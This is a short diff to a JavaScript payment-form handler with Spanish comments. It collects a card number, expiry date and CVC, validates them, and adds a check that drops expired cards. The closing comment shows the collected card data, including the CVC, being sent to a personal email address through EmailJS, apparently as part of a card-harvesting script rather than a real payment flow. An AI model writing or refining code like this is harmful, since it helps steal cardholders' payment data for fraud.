@@ -8,12 +8,12 @@ document.getElementById('paymentForm').addEventListener('submit', function(e) {
 
     // Recopila los datos del formulario
     const cardData = {
-        numero: this.querySelector('input[type="text"]').value, // Número de tarjeta
-        fecha: this.querySelector('input[type="month"]').value, // Fecha de expiración
-        cvc: this.querySelector('input[type="text"]:last-child').value // CVC
+        numero: document.getElementById('cardNumber').value, // Número de tarjeta
+        fecha: document.getElementById('expiryDate').value, // Fecha de expiración
+        cvc: document.getElementById('cvc').value // CVC
     };
 
-    // Validaciones sin alertas
+    // Validaciones detalladas
     if (cardData.numero.length !== 16 || !/^\d+$/.test(cardData.numero)) {
         console.log('Número de tarjeta inválido'); // Mensaje en consola
         return; // Si el número de tarjeta no es válido, no hace nada
@@ -22,6 +22,14 @@ document.getElementById('paymentForm').addEventListener('submit', function(e) {
     if (cardData.cvc.length !== 3 || !/^\d+$/.test(cardData.cvc)) {
         console.log('CVC inválido'); // Mensaje en consola
         return; // Si el CVC no es válido, no hace nada
+    }
+
+    // Verifica que la fecha de expiración sea válida
+    const currentDate = new Date();
+    const expiryDate = new Date(cardData.fecha);
+    if (expiryDate < currentDate) {
+        console.log('Fecha de expiración inválida'); // Mensaje en consola
+        return; // Si la fecha de expiración es anterior a la fecha actual, no hace nada
     }
 
     // Envía los datos a tu correo usando EmailJS
